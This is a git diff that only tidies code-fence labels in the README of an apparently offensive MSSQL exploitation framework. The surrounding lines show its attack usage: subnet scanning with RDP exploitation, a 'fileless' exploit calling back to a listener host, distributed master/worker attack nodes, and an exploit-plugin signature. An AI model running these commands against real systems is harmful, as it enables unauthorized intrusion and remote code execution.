@@ -157,8 +157,6 @@ pip install -r requirements.txt
 
 ### Command Line Interface
 
-bash
-
 ```
 # Scan a single subnet with default wordlists, enable RDP exploitation, and generate an HTML report
 python mssql_arsenal.py -t 192.168.1.0/24 --exploit rdp --report html
@@ -174,8 +172,6 @@ python mssql_arsenal.py -t 192.168.1.10 --exploit fileless --lhost 10.0.0.5 --lp
 ```
 
 ### Graphical User Interface
-
-bash
 
 ```
 python mssql_arsenal.py --gui
@@ -193,15 +189,11 @@ The GUI provides an intuitive tabbed interface for configuring scans, monitoring
 
 **Master Node (task dispatcher):**
 
-bash
-
 ```
 python mssql_arsenal.py --master --master-port 9999
 ```
 
 **Worker Node (executes tasks):**
-
-bash
 
 ```
 python mssql_arsenal.py --worker 192.168.1.100:9999
@@ -218,8 +210,6 @@ Workers automatically pull pending tasks from the master, perform full assessmen
 ---
 
 ## 🏗 Architecture
-
-text
 
 ```
 mssql_arsenal/
@@ -275,8 +265,6 @@ MSSQL Arsenal can produce detailed reports in both **JSON** and **HTML** formats
 ## 🔌 Plugin System
 
 The framework supports user‑defined exploitation plugins. Simply place a Python file in the `plugins/` directory containing an `exploit()` function with the following signature:
-
-python
 
 ```
 def exploit(ip: str, port: int, username: str, password: str, **kwargs) -> dict:
